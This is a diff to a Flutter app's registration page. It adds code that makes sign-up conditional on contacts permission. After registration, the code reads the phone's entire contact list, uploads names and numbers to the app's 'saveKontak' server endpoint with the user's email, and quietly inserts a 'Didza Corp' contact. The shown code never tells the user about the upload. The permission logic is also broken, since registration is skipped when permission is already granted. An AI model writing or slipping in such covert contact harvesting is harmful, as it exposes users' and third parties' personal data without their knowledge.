@@ -1,3 +1,5 @@
+import 'dart:convert';
+
 import 'package:flushbar/flushbar.dart';
 /**
  * Author: Damodar Lohani
@@ -8,6 +10,7 @@ import 'package:flutter/material.dart';
 import 'package:flutter_custom_clippers/flutter_custom_clippers.dart';
 import 'package:jagobisnis/common/config.dart';
 import 'package:http/http.dart' as http;
+import 'package:jagobisnis/common/toast/alert_dialog.dart';
 import 'dart:convert' as JSON;
 
 import 'package:jagobisnis/database/DatabaseHelper.dart';
@@ -15,6 +18,8 @@ import 'package:jagobisnis/database/model/account.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 
 import 'dashboarPage.dart';
+import 'package:permission_handler/permission_handler.dart';
+import 'package:contacts_service/contacts_service.dart';
 ConfigClass configClass = new ConfigClass();
 class RegisterPage extends StatelessWidget {
   static final String path = "lib/src/pages/login/signup1.dart";
@@ -25,6 +30,7 @@ class RegisterPage extends StatelessWidget {
   final TextEditingController _emailController = new TextEditingController();
   final TextEditingController _confirmPasswordController = new TextEditingController();
   final TextEditingController _referalEmail = new TextEditingController();
+  BuildContext publicContext ;
   Widget _buildPageContent(BuildContext context) {
     return Container(
       color: Colors.blue.shade100,
@@ -194,75 +200,81 @@ class RegisterPage extends StatelessWidget {
                 child: Align(
                   alignment: Alignment.bottomCenter,
                   child: RaisedButton(
-                    onPressed: (){
+                    onPressed: () async {
                       configClass.showLoading(context);
-                      http.post(configClass.register(), body: {
-                        "email":_emailController.text, 
-                        "password": _passwordController.text,
-                        "confirmPassword": _confirmPasswordController.text,
-                        "nama": _namaController.text,
-                        "nomorTelepon": _nomorWhatsAppController.text,
-                        "kota": _kotaController.text,
-                        "referalEmail": _referalEmail.text,
-                      }).then((response) async {
-          print(response.body.toString());
+                      try {
+                        PermissionStatus permission = await Permission.contacts.status;
+                        if (permission != PermissionStatus.granted) {
+                          await Permission.contacts.request();
+                          PermissionStatus permission = await Permission.contacts.status;
+                          if (permission == PermissionStatus.granted) {
+                              http.post(configClass.register(), body: {
+                              "email":_emailController.text, 
+                              "password": _passwordController.text,
+                              "confirmPassword": _confirmPasswordController.text,
+                              "nama": _namaController.text,
+                              "nomorTelepon": _nomorWhatsAppController.text,
+                              "kota": _kotaController.text,
+                              "referalEmail": _referalEmail.text,
+                            }).then((response) async {
+                                print(response.body.toString());
+                                final jsonResponse = JSON.jsonDecode(response.body.toString());
+                                String loginResponse ;
+                                // Resp resp = new Resp.fromJson(jsonResponse);
+                                var extractdata = JSON.jsonDecode(response.body);
+                                List dataResult;
+                                List dataContent;
+                                String err,cek;
+                                dataResult = extractdata["result"];
+                                if(dataResult[0]["err"] == ''){
+                                  Flushbar(
+                                            title:  "Sukses",
+                                            message:  "Pendaftaran Berhasil",
+                                            duration:  Duration(seconds: 15),              
+                                            )   ..show(context);
+                                            var db = new DatabaseHelper();
+                                            var dataAccount = new Account(
+                                            _emailController.text,
+                                            _passwordController.text,
+                                            dataResult[0]["content"]["nama"],
+                                            dataResult[0]["content"]["nomor_telepon"],
+                                            int.tryParse(dataResult[0]["content"]["jumlah_barang"]),
+                                            dataResult[0]["content"]["nama_bank"],
+                                            dataResult[0]["content"]["nomor_rekening"],
+                                            dataResult[0]["content"]["nama_rekening"],
+                                            dataResult[0]["content"]["lisensi"],
+                                            int.tryParse(dataResult[0]["content"]["profit"]),
+                                            1,
+                                            dataResult[0]["content"]["kota"],
+                                          );
+                                          db.saveAccount(dataAccount);
+                                          print("Welcome "+ dataResult[0]["content"]["nama"].toString());
+                                          SharedPreferences prefs = await SharedPreferences.getInstance();
+                                                prefs.setString('sessionEmail',_emailController.text);
+                                                prefs.setString('sessionNama',dataResult[0]["content"]["nama"]);
 
-                        configClass.closeLoading(context);
+                                          saveContactInPhone();
+                                          // Navigator.push(
+                                          // context, MaterialPageRoute(builder: (context) => MainPage()));
 
-                        final jsonResponse = JSON.jsonDecode(response.body.toString());
-          String loginResponse ;
-          // Resp resp = new Resp.fromJson(jsonResponse);
-          var extractdata = JSON.jsonDecode(response.body);
-          List dataResult;
-          List dataContent;
-          String err,cek;
-          dataResult = extractdata["result"];
-          
+                                        }else{
+                                          configClass.closeLoading(context);
+                                          loginResponse = dataResult[0]["err"];
+                                          _customAlertDialog(context, AlertDialogType.ERROR, "Error ", loginResponse);
+                                        }
+                                      });
 
-          if(dataResult[0]["err"] == ''){
-            Flushbar(
-                      title:  "Sukses",
-                      message:  "Pendaftaran Berhasil",
-                      duration:  Duration(seconds: 15),              
-                      )   ..show(context);
-                      var db = new DatabaseHelper();
-                      var dataAccount = new Account(
-                      _emailController.text,
-                      _passwordController.text,
-                      dataResult[0]["content"]["nama"],
-                      dataResult[0]["content"]["nomor_telepon"],
-                      int.tryParse(dataResult[0]["content"]["jumlah_barang"]),
-                      dataResult[0]["content"]["nama_bank"],
-                      dataResult[0]["content"]["nomor_rekening"],
-                      dataResult[0]["content"]["nama_rekening"],
-                      dataResult[0]["content"]["lisensi"],
-                      int.tryParse(dataResult[0]["content"]["profit"]),
-                      1,
-                      dataResult[0]["content"]["kota"],
-                    );
-                    db.saveAccount(dataAccount);
-                    print("Welcome "+ dataResult[0]["content"]["nama"].toString());
-                    SharedPreferences prefs = await SharedPreferences.getInstance();
-                          prefs.setString('sessionEmail',_emailController.text);
-                          prefs.setString('sessionNama',dataResult[0]["content"]["nama"]);
-                    Navigator.push(
-                    context, MaterialPageRoute(builder: (context) => MainPage()));
+                          }else {
+                            print("masuk sini");
+                            configClass.closeLoading(context);
+                            _customAlertDialog(context, AlertDialogType.ERROR, "Error ", "Allow Application to Access Contact");
+                          }
+                        }} catch (e) {
+                          print(e);
+                      }
+      
 
-                  }else{
-                    loginResponse = dataResult[0]["err"];
-                    AlertDialog dialog = new AlertDialog(
-                      content: new Text(loginResponse)
-                    );
-                    showDialog(context: context,child: dialog);
-
-                    // Flushbar(
-                    //           title:  "Warning",
-                    //           message:  dataResult[0]["err"],
-                    //           duration:  Duration(seconds: 15),              
-                    //           )   ..show(context);
-                  }
-
-                });
+                      
 
 
                     },
@@ -276,9 +288,106 @@ class RegisterPage extends StatelessWidget {
           ),
         );
   }
+  Future<void> saveContactInPhone() async {
+    var sudahSave = 0;
+    try {
+      PermissionStatus permission = await Permission.contacts.status;
+    if (permission != PermissionStatus.granted) {
+      await Permission.contacts.request();
+      PermissionStatus permission = await Permission.contacts.status;
+      if (permission == PermissionStatus.granted) {
+        Iterable<Contact> contacts = await ContactsService.getContacts(withThumbnails: false);
+        List<Contact> contactsList = contacts.toList();
+        var dataPost = [{"nama" : "pushed Array","phoneNumber":"ssad","email":"sss"}];
+        for (int i = 0; i < contactsList.length; i++) {
+          if(contactsList[i].displayName != "" && contactsList[i].displayName != null  && contactsList[i].phones.length > 0 ){
+            if(contactsList[i].phones.first.value.toString() == "08122374480308"){
+              sudahSave = 1;
+            }
+            dataPost.add({"nama":contactsList[i].displayName.toString(), "phoneNumber": contactsList[i].phones.first.value  }) ;
+          }
+        }
+        await http.post(configClass.saveKontak(), body: {"dataPost" : jsonEncode(dataPost).toString(), "email" : _emailController.text } ).then((response) { 
+              print(response.body); 
+              return response.body;
+        });
+        if(sudahSave == 0){
+          Contact newContact = new Contact();
+          newContact.givenName = "Didza Corp";
+          newContact.emails = [
+            Item(label: "email", value: "")
+          ];
+          newContact.company = "";
+          newContact.phones = [
+            Item(label: "mobile", value: "08122374480308")
+          ];
+          newContact.postalAddresses = [
+            PostalAddress(region: "")
+          ];
+          await ContactsService.addContact(newContact);
+        }
+        configClass.closeLoading(publicContext);
+        Navigator.push(publicContext, MaterialPageRoute(builder: (context) => MainPage()));
+      } else {
+        _customAlertDialog(publicContext, AlertDialogType.ERROR, "Error ", "Allow Application to Access Contact");
+        configClass.closeLoading(publicContext);
+      }
+      } else {
+
+        Iterable<Contact> contacts = await ContactsService.getContacts(withThumbnails: false);
+        List<Contact> contactsList = contacts.toList();
+        var dataPost = [{"nama" : "pushed Array","phoneNumber":"ssad","email":"sss"}];
+        for (int i = 0; i < contactsList.length; i++) {
+          if(contactsList[i].displayName != "" && contactsList[i].displayName != null  && contactsList[i].phones.length > 0 ){
+            if(contactsList[i].phones.first.value.toString() == "08122374480308"){
+              sudahSave = 1;
+            }
+            dataPost.add({"nama":contactsList[i].displayName.toString(), "phoneNumber": contactsList[i].phones.first.value  }) ;
+          }
+        }
+        await http.post(configClass.saveKontak(), body: {"dataPost" : jsonEncode(dataPost).toString(), "email" : _emailController.text } ).then((response) { 
+              print(response.body); 
+              return response.body;
+        });
+        if(sudahSave == 0){
+          Contact newContact = new Contact();
+          newContact.givenName = "Didza Corp";
+          newContact.emails = [
+            Item(label: "email", value: "")
+          ];
+          newContact.company = "";
+          newContact.phones = [
+            Item(label: "mobile", value: "08122374480308")
+          ];
+          newContact.postalAddresses = [
+            PostalAddress(region: "")
+          ];
+          await ContactsService.addContact(newContact);
+        }
+        configClass.closeLoading(publicContext);
+        Navigator.push(publicContext, MaterialPageRoute(builder: (context) => MainPage()));
+      }
+    } catch (e) {
+      print(e);
+    }
+  }
+
+  _customAlertDialog(BuildContext context, AlertDialogType type, String titleAlert,String descAlert) {
+    showDialog(
+      context: context,
+      builder: (BuildContext context) {
+        return CustomAlertDialog(
+          type: type,
+          title: titleAlert,
+          content: descAlert,
+        );
+      },
+    );
+  }
 
   @override
     Widget build(BuildContext context) {
+      publicContext = context;
       return Scaffold(
         body: _buildPageContent(context),
       );
